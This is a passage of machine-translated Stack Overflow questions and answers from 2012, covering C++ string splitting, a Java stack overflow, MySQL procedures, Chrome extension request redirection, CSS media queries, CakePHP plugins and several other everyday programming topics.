<bean id="jpaDialect" class="org.springframework.orm.jpa.vendor.HibernateJpaDialect" /> 
```**

# algorithm - 动态分类类别

> ID：12392950
> 
> 赞同：0
> 
> 时间：2012-09-12T16:52:25.193
> 
> 标签：algorithm

我对编程算法的想法很陌生。我可以处理简单的想法，但我目前的项目要求我创建一些更复杂的东西。

我正在尝试创建一个基于关键字和“一般”类别子集的分类系统，这些分类系统过滤成更详细的类别，需要用户尽可能少的工作。

IE

体育 >> 棒球 >> 投球 >> Nolan Ryan

因此，如果用户决定他们想要谈论“棒球”并且他们过滤了搜索，我还想包括“体育”

用户输入：“棒球”

然后用户被带到体育>>棒球

现在我明白，如果没有一个以某种方式将这两个类别联系起来的活生生的动态程序，这将是不可能的。它最初还需要“一些”用户输入，并且在软件的整个生命周期中需要更多输入，以便维护它并使其保持最新。

但是，唉，如果没有详细说明我正在尝试做的事情的具体细节，要求这样的算法将是轻浮的。而且我并不是要寻求帮助。

相反，**我很好奇人们是否知道已经实施的类似系统，以及是否有文档描述它是如何完成的。甚至是您自己项目的一些真实示例。**

简而言之，我有一个“计划”，但它需要的用户输入比我真正想要的要多。在开始开发这个程序之前，我觉得获得更多关于这个主题的信息将是最好的做法。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T17:00:40.570

恕我直言，这并不像你想象的那么难。你想要什么被调用`Tagging`，你可以通过设置标签之间的相关性来自动完成它（即一个`Tag`可以有它的有意义的信息加上它与其他的关系。然后，如果用户很好地选择了一个标签，你可以通过查看你的ADT 集合（可以像数组一样简单）。

```
Tag: 
    Sport
Related Tags
    Football
    Soccer 
```

...

我希望这会有所帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-13T09:27:02.253

听起来您想要做的是创建一个树/菜单结构，然后能够快速检索树中任何给定键的“面包屑”。

这是我的想法：

1.  创建包含所有分支的树。如果你想让分支共享密钥也没关系——只要你能给用户一个“找到多个，请选择哪一个......？”的“选择”。

2.  对于树中的每个键，生成面包屑。这很耗时，如果树非常大并且定期更新，那么离线、在云中或通过 hadoop 等可能会更好。

3.  将键和面包屑存储在诸如 redis 之类的键/值存储中，或者根据需要存储在内存/缓存中。如果您想跨类别/分支共享键，您将希望每个值都有一个数组。

4.  当用户选择一个键时 - 在存储中查找该键，并且如果结果值仅包含一个匹配项，那么您只需构造面包屑以将用户带到您希望他们去的地方。如果它有多个，你给他们一个选择。

我什至会说，如果您需要更有机的东西，比如说用户可以从其他任何地方动态创建“新主题”，那么您可能希望在初始导入后根本不使用树 - 而只是更新您的键/值存储实时。

# c++ - 在 C++ 中创建字符串拆分函数

> ID：12392951
> 
> 赞同：3
> 
> 时间：2012-09-12T16:52:25.663
> 
> 标签：c++, string, pass-by-reference, static-variables

> **可能重复：**
> [在 C++ 中拆分字符串](https://stackoverflow.com/questions/236129/splitting-a-string-in-c)

我试图创建一个模仿函数行为的`getline()`函数，并可以选择使用分隔符将字符串拆分为标记。该函数接受 2 个字符串（第二个通过引用传递）和一个`char`分隔符类型。它遍历第一个字符串的每个字符，将其复制到第二个字符串，并在到达分隔符时停止循环。`true`如果第一个字符串在分隔符之后有更多字符，则返回，`false`否则返回。最后一个字符的位置保存在静态变量中。由于某种原因，程序进入无限循环并且没有执行任何操作：

```
const int LINE_SIZE = 160;
bool strSplit(string sFirst, string & sLast, char cDelim) {
    static int iCount = 0;
    for(int i = iCount; i < LINE_SIZE; i++) {
        if(sFirst[i] != cDelim)
            sLast[i-iCount] = sFirst[i];
        else {
            iCount = i+1;
            return true;
        }
    }
    return false;
} 
```

该函数的使用方式如下：

```
while(strSplit(sLine, sToken, '|')) {
    cout << sToken << endl;
} 
```

为什么它会进入无限循环，为什么它不起作用？`istringstream`如果可能的话，我应该补充一点，我对不使用的解决方案感兴趣。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-12T16:55:28.197

这不完全是您所要求的，但您考虑过`std::istringstream`吗`std::getline`？

```
// UNTESTED
std::istringstream iss(sLine);
while(std::getline(iss, sToken, '|')) {
  std::cout << sToken << "\n";
} 
```

* * *

**编辑**：

> 为什么它会进入无限循环，为什么它不起作用？

我们不知道，你没有提供足够的信息。尝试创建一个[SSCCE](http://sscce.org)并将其发布。

我*可以*告诉你，下面这行非常可疑：

```
 sLast[i-iCount] = sFirst[i]; 
```

此行将在以下任何情况下导致未定义的行为（可能包括您所看到的）：

*   `i >= sFirst.size()`
*   `i-iCount >= sLast.size()`
*   `i-iCount < 0`

在我看来，所有这些条件都可能是真的。例如，如果传入的字符串短于 160 行，或者如果`iCount`增长到大于第一个分隔符的偏移量，那么您将获得未定义的行为。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-12T17:09:26.257

`LINE_SIZE`可能大于`string`对象中的字符数，因此代码在字符串存储的末尾运行，几乎任何事情都可能发生。

而不是自己滚动，`string::find`做你需要的。

```
std::string::size_type pos = 0;
std::string::size_type new_pos = sFirst.find('|', pos); 
```

调用`find`查找第一次出现的 '|' 那是在位置'pos'处或之后。如果成功，则返回 '|' 的索引 它发现。如果失败，则返回`std::string::npos`. 在循环中使用它，每次匹配后，将文本从 [pos, new_pos) 复制到目标字符串中，并更新`pos`为`new_pos + 1`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-12T16:57:29.007

你确定这是`strSplit()`不返回的函数还是你的调用者`while`循环是无限的？

你的调用者循环不应该是这样的：

```
while(strSplit(sLine, sToken, '|')) {
    cout << sToken << endl;
    cin >> sLine >> endl;
} 
```

- 编辑 -

如果值 of`sLine`使得它`strSplit()`返回 true 则`while`循环变为无限.. 所以做一些事情来改变`sLine`循环的每次迭代的值.. 例如放入一个`cin`..

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-12T17:01:36.363

看一下这个

```
std::vector<std::string> spliString(const std::string &str, 
                                    const std::string &separator)
{
    vector<string>      ret;
    string::size_type   strLen = str.length();
    char                *buff;
    char                *pch;

    buff = new char[strLen + 1];
    buff[strLen] = '\0';
    std::copy(str.begin(), str.end(), buff);

    pch = strtok(buff, separator.c_str());
    while(pch != NULL)
    {
        ret.push_back(string(pch));
        pch = strtok(NULL, separator.c_str());
    }

    delete[] buff;

    return ret;
} 
```

# java - Java 安全更新后使用 SAXReader 时出现 StackOverFlowError

> ID：12392954
> 
> 赞同：1
> 
> 时间：2012-09-12T16:52:31.990
> 
> 标签：java, macos, stack-overflow

运行 Mac (OS X 10.8.1)。我们已升级到最新的 Java 安全更新 1.6.0_35-b10-428，此后我们的主应用程序无法在 Eclipse 中启动。

启动 Openfire 3.6.4 时会引发以下异常。几乎解析 openfire.xml 配置的地方是错误发生的时间：

```
 private void buildDoc(Reader in) throws IOException {
    try {
        SAXReader xmlReader = new SAXReader();
        xmlReader.setEncoding("UTF-8");
        document = xmlReader.read(in);
    }
    catch (Exception e) {
        Log.error("Error reading XML properties", e);
        System.out.println("NOOO");
        e.printStackTrace();
        throw new IOException(e.getMessage());
    }
    finally {
        if (in != null) {
            in.close();
        }
    }
} 
```

抛出异常：

```
Exception in thread "main" java.lang.StackOverflowError
at java.nio.HeapByteBuffer.<init>(HeapByteBuffer.java:52)
at java.nio.ByteBuffer.wrap(ByteBuffer.java:350)
at java.nio.ByteBuffer.wrap(ByteBuffer.java:373)
at java.lang.StringCoding$StringEncoder.encode(StringCoding.java:237)
at java.lang.StringCoding.encode(StringCoding.java:272)
at java.lang.String.getBytes(String.java:946)
at java.io.UnixFileSystem.getBooleanAttributes0(Native Method)
at java.io.UnixFileSystem.getBooleanAttributes(UnixFileSystem.java:228)
at java.io.File.exists(File.java:733)
at sun.misc.URLClassPath$FileLoader.getResource(URLClassPath.java:999)
at sun.misc.URLClassPath.getResource(URLClassPath.java:169)
at java.net.URLClassLoader$1.run(URLClassLoader.java:194)
at java.security.AccessController.doPrivileged(Native Method)
at java.net.URLClassLoader.findClass(URLClassLoader.java:190)
at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:301)
at java.lang.ClassLoader.loadClass(ClassLoader.java:247)
at java.lang.ClassLoader.defineClass1(Native Method)
at java.lang.ClassLoader.defineClassCond(ClassLoader.java:631)
at java.lang.ClassLoader.defineClass(ClassLoader.java:615)
at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:141)
at java.net.URLClassLoader.defineClass(URLClassLoader.java:283)
at java.net.URLClassLoader.access$000(URLClassLoader.java:58)
at java.net.URLClassLoader$1.run(URLClassLoader.java:197)
at java.security.AccessController.doPrivileged(Native Method)
at java.net.URLClassLoader.findClass(URLClassLoader.java:190)
at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:301)
at java.lang.ClassLoader.loadClass(ClassLoader.java:247)
at java.lang.ClassLoader.defineClass1(Native Method)
at java.lang.ClassLoader.defineClassCond(ClassLoader.java:631)
at java.lang.ClassLoader.defineClass(ClassLoader.java:615)
at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:141)
at java.net.URLClassLoader.defineClass(URLClassLoader.java:283)
at java.net.URLClassLoader.access$000(URLClassLoader.java:58)
at java.net.URLClassLoader$1.run(URLClassLoader.java:197)
at java.security.AccessController.doPrivileged(Native Method)
at java.net.URLClassLoader.findClass(URLClassLoader.java:190)
at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:301)
at java.lang.ClassLoader.loadClass(ClassLoader.java:247)
at java.lang.ClassLoader.defineClass1(Native Method)
at java.lang.ClassLoader.defineClassCond(ClassLoader.java:631)
at java.lang.ClassLoader.defineClass(ClassLoader.java:615)
at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:141)
at java.net.URLClassLoader.defineClass(URLClassLoader.java:283)
at java.net.URLClassLoader.access$000(URLClassLoader.java:58)
at java.net.URLClassLoader$1.run(URLClassLoader.java:197)
at java.security.AccessController.doPrivileged(Native Method)
at java.net.URLClassLoader.findClass(URLClassLoader.java:190)
at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:301)
at java.lang.ClassLoader.loadClass(ClassLoader.java:247)
at org.dom4j.DocumentFactory.createDocument(DocumentFactory.java:102)
at org.dom4j.DocumentFactory.createDocument(DocumentFactory.java:122)
at org.dom4j.io.SAXContentHandler.createDocument(SAXContentHandler.java:830)
at org.dom4j.io.SAXContentHandler.getDocument(SAXContentHandler.java:164)
at org.dom4j.io.SAXContentHandler.comment(SAXContentHandler.java:428)
at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.comment(AbstractSAXParser.java:667)
at com.sun.org.apache.xerces.internal.impl.dtd.XMLDTDValidator.comment(XMLDTDValidator.java:978)
at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:479)
at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:808)
at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737)
at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:119)
at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1205)
at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:522)
at org.dom4j.io.SAXReader.read(SAXReader.java:465)
at org.dom4j.io.SAXReader.read(SAXReader.java:365)
at org.jivesoftware.util.XMLProperties.buildDoc(XMLProperties.java:471)
at org.jivesoftware.util.XMLProperties.<init>(XMLProperties.java:114)
at org.jivesoftware.util.XMLProperties.<init>(XMLProperties.java:63)
at org.jivesoftware.util.JiveGlobals.loadSetupProperties(JiveGlobals.java:832)
at org.jivesoftware.util.JiveGlobals.getXMLProperty(JiveGlobals.java:282)
at org.jivesoftware.util.JiveGlobals.isSetupMode(JiveGlobals.java:791)
at org.jivesoftware.util.JiveGlobals.getProperty(JiveGlobals.java:529)
at org.jivesoftware.openfire.XMPPServer.initialize(XMPPServer.java:300)
at org.jivesoftware.openfire.XMPPServer.start(XMPPServer.java:419)
at org.jivesoftware.openfire.XMPPServer.<init>(XMPPServer.java:163)
at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:39)
at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:27)
at java.lang.reflect.Constructor.newInstance(Constructor.java:513)
at java.lang.Class.newInstance0(Class.java:355)
at java.lang.Class.newInstance(Class.java:308)
at org.jivesoftware.openfire.starter.ServerStarter.start(ServerStarter.java:106)
at org.jivesoftware.openfire.starter.ServerStarter.main(ServerStarter.java:51) 
```

编辑：按照建议添加了 Xss1m，但是当应用程序进一步发展时，我看到了同样的错误。这是我的启动参数：

这是我的启动参数：

-DopenfireHome="${workspace_loc:openfire}/target/openfire" -Djava.net.preferIPv4Stack=true -Xms32m -Xmx512m -Xss1m -XX:ThreadStackSize=128 -XX:PermSize=72m -XX:MaxPermSize=96m -XX: +PrintGCDetails -Xloggc:/tmp/gc.log -XX:+HeapDumpOnOutOfMemoryError

编辑2：

似乎以下修改工作：将 -Xss128k 修改为 -Xss1m 并删除 -XX:ThreadStackSize=128

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-12T16:55:53.653

您是否尝试增加堆栈大小？您可以通过指定`-Xss1m`何时启动 JVM 来实现。在示例中，JVM 将为每个线程分配 1 兆字节的堆栈。注意不要使用太大的值，因为它会乘以应用程序中的线程数。

要更改 Eclipse 中的配置，请按照以下步骤操作（从[此处](https://stackoverflow.com/a/2127262/51260)复制）。

* * *

打开应用程序的**运行配置**（运行/运行配置...，然后在“Java 应用程序”中查找应用程序条目）。

参数选项卡有一个文本框 Vm 参数，输入 -Xss1m（或更大的参数以获得最大堆栈大小）。默认值为 512 KB。

* * *

编辑：

看起来这是一个普遍的问题。安全补丁可能引入了另一个对链的方法调用，并且过去适合堆栈的所有项目不再适合。

# mysql - MySQL：在另一个存储过程中调用存储过程时获取返回码？

> ID：12392955
> 
> 赞同：0
> 
> 时间：2012-09-12T16:52:33.633
> 
> 标签：mysql, sql, stored-procedures

您有 2 个 MySQL 存储过程，它们都在最后选择返回码。您需要在另一个中调用 1 个存储过程，并获取其返回码。这可能吗？

过程1：

```
CREATE PROCEDURE (IN...)
BEGIN
DECLARE ret_code
...UPDATE SOMETHING....
SELECT ret_code as return_code from dual;
END 
```

过程2：

```
CREATE PROCEDURE (IN...)
BEGIN
DECLARE returnVal
if(conditional true)
    ..Update something else..
    Set returnVal = x;
else
    call proc1(var1,...)
    Set returnVal = (ret_code obtained from proc1)
end if
select returnVal;
END 
```

在 proc2 中调用 proc1 时，如何获取在 proc2 中 proc1 末尾选择的 ret_code？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T17:06:54.220

您应该使用`CREATE FUNCTION`而不是`CREATE PROCEDURE`：

```
CREATE FUNCTION (...) RETURNS ...datatype...
BEGIN
DECLARE ret_code
...UPDATE SOMETHING....
RETURN ret_code;
END

CREATE FUNCTION (...) RETURNS ...datatype...
BEGIN
DECLARE returnVal
if(conditional true)
    ..Update something else..
    Set returnVal = x;
else
    Set returnVal = proc1(var1,...)
end if
RETURN returnVal;
END 
```

或者`OUT`为过程指定一个参数，并使用它：

```
CREATE PROCEDURE (OUT ret_code ...datatype..., IN...)
BEGIN
...UPDATE SOMETHING....
Set ret_code = return_code;
END

CREATE PROCEDURE (OUT returnVal ...datatype..., IN...)
BEGIN
if(conditional true)
    ..Update something else..
    SET returnVal = x;
else
    call proc1(returnVal, var1,...)
end if
END 
```

# php - 使用 drupal 的动态选择框

> ID：12392956
> 
> 赞同：0
> 
> 时间：2012-09-12T16:52:35.240
> 
> 标签：php, drupal-7

我正在尝试在 drupal 7 中创建几个下拉菜单，我有一系列与特定沙箱相关的任务。用户选择沙箱并获得一个填充了该沙箱任务的选择，然后他再次选择该沙箱。

依赖下拉列表需要将每个任务放在一个数组中，然后是所有这些数组，这是硬代码版本......

```
$optionsB = array(
t('level 1') => drupal_map_assoc(doTasksQuery('level 1')),
t('level 2') => drupal_map_assoc(doTasksQuery('level 2')),
t('level 3') => drupal_map_assoc(doTasksQuery('level 3')), 
```

);

doTasksQuery() 使用 drupals db_query() 返回每个级别的任务列表。

如何使这种动态化以允许可变数量的级别？因为它们是固定的。我还有另一种方法来返回返回 php 关联数组的级别名​​称，我宁愿使用它来填充键值而不是硬编码它们。

感谢您的关注

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T17:54:54.407

如果您在数组 $levels 中有级别名称：

```
$optionsB = array();
foreach ( $levels as $level ) {
    $optionsB[ t( $level ) ] = drupal_map_assoc( doTasksQuery( $level ) );
} 
```

# spring - 设置 Google OpenId 登录

> ID：12392958
> 
> 赞同：10
> 
> 时间：2012-09-12T16:52:46.403
> 
> 标签：spring, login, spring-security, openid, google-openid

我很难学习如何将 Google OpenId 支持集成到我的 spring 3.1 Web 应用程序（包括 Spring security 3.1）。

我找到了一些文档和教程，但对我的帮助还不够。

喜欢：

[Springsource openId 文档](http://static.springsource.org/spring-security/site/docs/3.0.x/reference/springsecurity-single.html#ns-openid)

[OpenId 上的 Solid Craft 教程](http://blog.solidcraft.eu/2011/04/spring-security-by-example-openid-login.html)

[向 OpenID 开放](http://www.packtpub.com/article/opening-up-to-openid-with-spring-security)

我仍然无法弄清楚如何使这项工作。

在应用程序中获取 google OpenId 登录工作需要哪些组件？我的意思是让这个运行的绝对最低要求是什么？没有什么额外的。

一个非常简单的例子会很棒。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-06-12T07:03:58.833

Google 对 OpenID 的支持将被删除：[https](https://developers.google.com/identity/protocols/OpenID2Migration) ://developers.google.com/identity/protocols/OpenID2Migration 。您应该使用 OAuth 或 OpenID Connect 支持。两者都受到[https://github.com/pac4j/spring-security-pac4j](https://github.com/pac4j/spring-security-pac4j)库（以及 CAS、SAML、GAE 和许多其他身份提供者）的支持。查看演示：[https ://github.com/pac4j/spring-security-](https://github.com/pac4j/spring-security-)

# iphone - 当您在 iTunes Connect 中将自动续订订阅的“已清除”设置为“否”时会发生什么？

> ID：12392960
> 
> 赞同：9
> 
> 时间：2012-09-12T16:52:54.430
> 
> 标签：iphone, ios, app-store-connect

我正在考虑在我的 iOS 应用程序中实现自动续订订阅，但我希望它在 2013 年 1 月之后完成。我的应用程序是一个基于时间的应用程序，在一月之后不再有意义。从我在这个 SO 问题上读到的内容：[Apple - Suspend/refund in-app auto-renewable subscription](https://stackoverflow.com/questions/7521563/apple-suspend-refund-in-app-auto-renewable-subscription)，如果我在 iTunes Connect 中“删除”应用内产品，所有活动订阅都将自动取消。我想我可以在一月份删除该产品，从而取消所有有效订阅。

据我所知，没有办法“删除”应用内产品。您只能将其设置为不“清除出售”。有人知道吗：

1.  如果真的有办法在产品上线后删除 iTunes Connect 中的应用内产品
2.  如果将自动续订订阅的“已清除销售”设置为“否”将有效地满足我的要求：取消所有有效的应用内订阅

谢谢！

# ajax - 将 AJAX 调用替换为另一个

> ID：12392961
> 
> 赞同：0
> 
> 时间：2012-09-12T16:52:57.857
> 
> 标签：ajax, google-chrome, google-chrome-extension

Chrome中是否有任何简单的方法可以将AJAX调用重定向到另一台服务器而不更改DNS？（例如：对[http://domain.com/page.html](http://domain.com/page.html)的调用将被定向到[http://localmachine.com/page.html](http://localmachine.com/page.html)）

我知道这可以通过更改 DNS 来完成，但这并不能解决我的问题，因为当我只想捕获单个 URL 时，它会将所有 domain.com 请求发送到 localmachine。

提前致谢！

*PS：如果有人知道已经这样做的扩展，那将非常受欢迎。如果没有，我会尝试自己开发一个 chrome 扩展*

补充：清单文件（在apsillers评论后）：

```
{
  "name": "My Extension",
  "version": "0.1",
  "background": {
  "script": "background.js"
  },
  "permissions" : [
    "webRequest",
    "webRequestBlocking",
    "background",
    "*://*/*"
  ],
  "manifest_version": 2
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T19:06:20.190

`onBeforeRequest`从[webRequest API](http://developer.chrome.com/extensions/webRequest.html)使用：

```
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        // only redirect if accessing this page via Ajax
        if(details.type == "xmlhttprequest") {
            return {redirectUrl:"http://localmachine.com/page.html"};
        }
    },
    {urls: ["http://domain.com/page.html"]},
    ["blocking"]); 
```

这将设置一个重定向脚本，该脚本捕获所有 Ajax 请求`http://domain.com/page.html`并导致它们从`http://localmachine.com/page.html`. 浏览器无法知道重定向已经发生；即，它认为结果确实是从`domain.com`.

# if-statement - 水晶报表 if 语句与多个表

> ID：12392970
> 
> 赞同：0
> 
> 时间：2012-09-12T16:53:22.133
> 
> 标签：if-statement, crystal-reports

我的报告从 EEO 表格的两个不同表中提取代码。一些员工被分配“工作”，而其他员工被分配“职位”——因此它们存储在不同的表中。

Jobs 表中的 EEO 代码`eeo_sub_code`由数字 2 到 9 组成。Positions 表中的 EEO 代码`position_group_code`由 EEO2 到 EEO9 组成。我希望这两个都显示为 EEO2 到 EEO9。

`jobs.eeo_sub_code`和`positions.position_group_code`bot 本质上包含 EEO 代码，所以我想将它们合并到一个列中。

到目前为止，我的代码仅显示`jobs.eeo_sub_code`条件。如何获得所需的行为？

```
if {jobs.eeo_sub_code} = '2' OR {positions.position_group_code} = 'EEO2' then 'EEO2' 
else if {jobs.eeo_sub_code} = '3' OR {positions.position_group_code} = 'EEO3' then 'EEO3' 
else if {jobs.eeo_sub_code} = '4' OR {positions.position_group_code} = 'EEO4' then 'EEO4' 
else if {jobs.eeo_sub_code} = '5' OR {positions.position_group_code} = 'EEO5' then 'EEO5' 
else if {jobs.eeo_sub_code} = '6' OR {positions.position_group_code} = 'EEO6' then 'EEO6' 
else if {jobs.eeo_sub_code} = '7' OR {positions.position_group_code} = 'EEO7' then 'EEO7' 
else if {jobs.eeo_sub_code} = '8' OR {positions.position_group_code} = 'EEO8' then 'EEO8' 
else if {jobs.eeo_sub_code} = '9' OR {positions.position_group_code} = 'EEO9' then 'EEO9' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T17:46:02.457

检查表之间的链接。如果正确链接，您可以尝试以下公式：

```
IF {jobs.eeo_sub_code} = '2' OR {positions.position_group_code} = 'EEO2'
  THEN 'EEO2' 
ELSE IF  {jobs.eeo_sub_code} = '3' OR {positions.position_group_code} = 'EEO3' 
  THEN 'EEO3'
ELSE IF  {jobs.eeo_sub_code} = '4' OR {positions.position_group_code} = 'EEO4' 
  THEN 'EEO4'

//...And so forth 
```

# cordova - 一个 Android 活动中有多个 CordovaWebViews？

> ID：12392978
> 
> 赞同：4
> 
> 时间：2012-09-12T16:53:49.717
> 
> 标签：cordova, cordova-2.0.0

CordovaWebView 是在 cordova 1.9 中引入的。 [http://docs.phonegap.com/en/2.0.0/guide_cordova-webview_android.md.html](http://docs.phonegap.com/en/2.0.0/guide_cordova-webview_android.md.html)

有人尝试将多个网络视图放在一项活动中吗？它会起作用吗？推荐吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T04:00:39.727

这是可行的。科尔多瓦指南确实提供了一些提示。

还假设 MyActivity 扩展 DriodGap 然后需要

1）覆盖`init()`方法

2）更改第一个（原始视图）的尺寸，使其不占用整个屏幕

```
this.appView.setLayoutParams(new LinearLayout.LayoutParams(
    [desired width],
    [desired height],
)); 
```

3) 创建一个新的 CordovaWebView，将其 LayoutParams 设置为类似于第一个。然后将其添加到根视图：

```
this.root.addView(cwv2); 
```

4) 现在应该显示两个 Web 视图。但是如果两个视图中都有输入，您会发现两个输入中都有焦点。

5）要摆脱双重焦点问题，请插入以下代码：

```
this.appView.requestFocus(View.FOCUS_DOWN);
this.appView.setOnTouchListener(new View.OnTouchListener() {
    public boolean onTouch(View v, MotionEvent event) {
        switch (event.getAction()) {
            case MotionEvent.ACTION_DOWN:
               case MotionEvent.ACTION_UP:
                   if (!v.hasFocus()) {
                       v.requestFocus();
                   }
                   break;
        }
        return false;
    }
}); 
```

# css - 响应式布局 - 使隐藏的 div 出现？

> ID：12392979
> 
> 赞同：3
> 
> 时间：2012-09-12T16:54:02.553
> 
> 标签：css, responsive-design

我对响应式布局很陌生。除了一件事之外，我似乎一切都对我有利：我无法使用`'display: none;'`属性制作 div，当我`'display: block;'`在媒体查询中将其设置为时出现。

```
#test {
display: none;
}
@media screen and (max-width:320px) {
   #test {

      display: block;
   }
} 
```

我需要jQuery吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T17:00:57.723

您的代码没有按您预期的那样运行，因为第一个规则`1 0 1`的特异性为 ，而第二个规则的特异性为`1 0 0`。

如果你只写`#test`, 而不是`div#test`，它将起作用，因为当两个规则具有相同的特异性时，将应用最后一个。

您可以在此处阅读有关 CSS 特异性的更多信息：

*   [http://css-tricks.com/specifics-on-css-specificity/](http://css-tricks.com/specifics-on-css-specificity/)
*   [http://coding.smashingmagazine.com/2007/07/27/css-specificity-things-you-should-know/](http://coding.smashingmagazine.com/2007/07/27/css-specificity-things-you-should-know/)
*   [http://coding.smashingmagazine.com/2010/04/07/css-specificity-and-inheritance/](http://coding.smashingmagazine.com/2010/04/07/css-specificity-and-inheritance/)
*   [http://reference.sitepoint.com/css/specificity](http://reference.sitepoint.com/css/specificity)
*   [http://snook.ca/archives/html_and_css/understanding_c](http://snook.ca/archives/html_and_css/understanding_c)
*   [http://net.tutsplus.com/tutorials/html-css-techniques/quick-tip-understanding-css-specificity/](http://net.tutsplus.com/tutorials/html-css-techniques/quick-tip-understanding-css-specificity/)
*   [http://www.standardista.com/css3/css-specificity/](http://www.standardista.com/css3/css-specificity/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T17:17:14.347

您的代码是正确的，您肯定不需要任何 jquery。当屏幕尺寸小于 320px 时会出现测试 div，如果你想相反使用 min-width。这是[示例](http://jsfiddle.net/jvqra/3/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T17:07:24.553

利用：

```
#test {
  display: none;
} 
```

写是没用的`div#test`，因为`#test`总是独一无二的。`div#test`只会减慢你的表现（像 0.000000000001s ;-) ）

演示：http:
[//jsfiddle.net/wpEwZ/](http://jsfiddle.net/wpEwZ/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-12T17:00:15.647

您没有正确选择#test：

```
div#test { display: none; }

@media screen and (max-width:320px) {
   div#test { display: block; }
}​ 
```

一个工作示例：http: [//jsfiddle.net/jvqra/](http://jsfiddle.net/jvqra/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-07-04T19:41:54.743

您的 CSS 必须指定“重要”才能使 div 出现

```
@media screen and (max-width:320px) {
  #test { block !important;}
}​ 
```

# design-patterns - 如何在插件中扩展控制器 - CakePHP

> ID：12392982
> 
> 赞同：2
> 
> 时间：2012-09-12T16:54:11.043
> 
> 标签：design-patterns, cakephp, plugins, extend, cakephp-2.1

这是一个设计模式问题。

我正在使用 CakePHP 2.1，并且正在编写一个插件（FooPlugin）。
我希望插件包含控制器（和模型），它们是应用程序中控制器的扩展。例如：我有一个`UsersController`在`app/Controller`FooPlugin 中作为 FooUsersController 扩展的其中，其中包含一些 Foo 特定的操作。*（我基本上是以插件的形式构建多个应用程序，它们都依赖于一个中央用户管理应用程序）*

让插件中的所有控制器扩展`FooAppController`. 但我想绕过 FooAppController 而让 FooUsersController 直接扩展 UsersController。
这打破了使用插件范围`beforeFilter`等的可能性......

我的问题：

*   这是否不仅仅是插件范围内的`beforeFilter`/ `beforeRender`？
*   我是否忽略了从 FooAppController 和 UsersController 继承功能的通用模式？还是我应该处理一种选择？
*   我提出的建议是一个很大的禁忌吗？或者只要我知道我遵循的模式就可以了？

亲切的问候，巴特

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-13T20:11:31.023

您可以在没有任何问题的情况下扩展应用程序控制器，确实不再存在插件范围的回调，您可以向插件控制器添加一个组件来处理插件范围的回调，也许可以作为解决方案，并且仍然保持插件控制器干燥

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-08-24T11:32:47.760

你可以简单地使用`App::uses('MyController', 'MyPluginName.Controller');`

根据 2.0 的文档：http: [//book.cakephp.org/2.0/en/core-utility-libraries/app.html#loading-files-from-plugins](http://book.cakephp.org/2.0/en/core-utility-libraries/app.html#loading-files-from-plugins)

其中说：

在插件中加载类与加载应用程序和核心类的工作方式非常相似，只是您必须指定要从中加载的插件：

```
// Load the class Comment in app/Plugin/PluginName/Model/Comment.php
App::uses('Comment', 'PluginName.Model');

// Load the class CommentComponent in
// app/Plugin/PluginName/Controller/Component/CommentComponent.php
App::uses('CommentComponent', 'PluginName.Controller/Component'); 
```

# user-interface - GUI Builder - GUI 不存在/消失

> ID：12392984
> 
> 赞同：1
> 
> 时间：2012-09-12T16:54:23.160
> 
> 标签：user-interface, google-apps-script

我昨天使用脚本编辑器中的“构建用户界面”功能为 Google 电子表格构建了几个 UI。昨晚一切正常，但是当我打开 Google 电子表格时，我发现没有 GUI。我刚刚开始学习如何使用 Google Scripts 并且遇到了一些问题。

1.  有没有办法恢复信息，所以我不必重做所有工作？
2.  这是 GUI 构建器工具的常见问题吗？

您可以提供的任何指导将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T22:44:12.423

这当然不是预期的，如果它不是暂时的，那么它可能是一个错误。请使用我们的[问题跟踪器](http://code.google.com/p/google-apps-script-issues/issues/list)报告此类问题。

# internet-explorer - IE 8 中没有背景图片

> ID：12392988
> 
